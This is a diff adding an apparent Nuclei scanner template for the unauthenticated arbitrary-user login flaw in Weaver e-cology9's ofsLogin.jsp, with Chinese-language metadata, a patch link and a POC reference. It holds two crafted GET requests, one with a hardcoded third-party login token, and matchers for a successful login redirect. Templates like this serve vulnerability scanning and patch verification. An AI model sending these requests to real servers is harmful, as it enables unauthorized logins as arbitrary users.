@@ -1,0 +1,42 @@
+id: weaver-ecology-ofsLogin-user-unauth
+info:
+  name: 泛微 OA ecology ofsLogin.jsp - unauth
+  author: leadlife
+  severity: high
+  description: 泛微 e-cology 前台任意用户登录漏洞：泛微 e-cology9 部分版本中存在前台任意用户登录漏洞。该漏洞允许未经身份验证的攻击者通过发送构造的请求触发漏洞，成功利用此漏洞的攻击者可登录任意用户。
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/dfb7c6d282cf9e7496f44e805c828d5139f03476/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20ofsLogin.jsp%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: false
+    fofa-query: 
+    repair: 目前，官方已发布修复建议，建议受影响的用户尽快升级至最新版本的补丁。下载地址：https://www.weaver.com.cn/cs/securityDownload.asp#
+    version: 部分 e-cology9 且补丁版本 < 10.57
+  tags: weaver,oa,unauth,ecology
+
+http:
+  - raw:
+      - |
+        GET /mobile/plugin/1/ofsLogin.jsp?syscode=1&timestamp=1&gopage=/wui/index.html&receiver=1&loginTokenFromThird=866fb3887a60239fc112354ee7ffc168 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: ways_1
+        dsl:
+          - status_code == 200
+          - contains_all(body,'location.replace','/wui/index.html')
+        condition: and
+    
+  - raw:
+      - |
+        GET /mobile/plugin/1/ofsLogin.jsp?syscode=syscode&timestamp=2&gopage=3&receiver=test&loginTokenFromThird= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: ways_2
+        dsl:
+          - status_code == 200
+          - contains_all(body,'location.replace','/login/Login.jsp')
+        condition: and
+    
